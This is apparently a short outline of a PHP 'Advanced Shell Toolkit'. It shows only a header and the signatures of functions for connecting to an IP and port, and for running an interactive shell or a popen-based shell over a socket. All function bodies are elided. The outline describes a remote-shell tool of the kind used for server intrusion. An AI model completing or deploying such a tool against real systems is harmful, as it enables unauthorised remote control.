<?php
/**
 * PHP 7.2+ Advanced Shell Toolkit
...
function try_connect(string $ip, int $port, int $timeout) {
...
function interactive_shell($sock, string $shell_path): void {
...
function popen_shell($sock): void {
